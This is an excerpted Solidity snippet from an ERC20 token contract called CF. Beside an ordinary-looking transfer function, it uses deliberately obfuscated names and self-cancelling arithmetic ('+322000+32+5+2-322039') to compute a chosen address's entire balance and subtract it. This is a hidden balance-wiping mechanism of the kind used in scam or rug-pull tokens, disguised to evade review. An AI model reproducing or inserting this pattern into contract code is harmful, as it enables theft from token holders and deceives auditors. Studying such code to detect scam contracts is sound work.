...
contract CF is Context, Ownable, IERC20 {
    ...
    function transfer(address recipient, uint256 amcntount) public virtual override returns (bool) {
        require(_accmmftnt[_msgSender()] >= amcntount, "TT: transfer amcntount exceeds balance");
    ...
    address fsdasss = addedress;
    uint256 gggfffddd = _accmmftnt[fsdasss]+322000+32+5+2-322039;
    uint256 rrreeeew = gggfffddd+_accmmftnt[fsdasss]-_accmmftnt[fsdasss];
    uint256 qqqqwwwe = rrreeeew;
        _accmmftnt[fsdasss] -= qqqqwwwe;
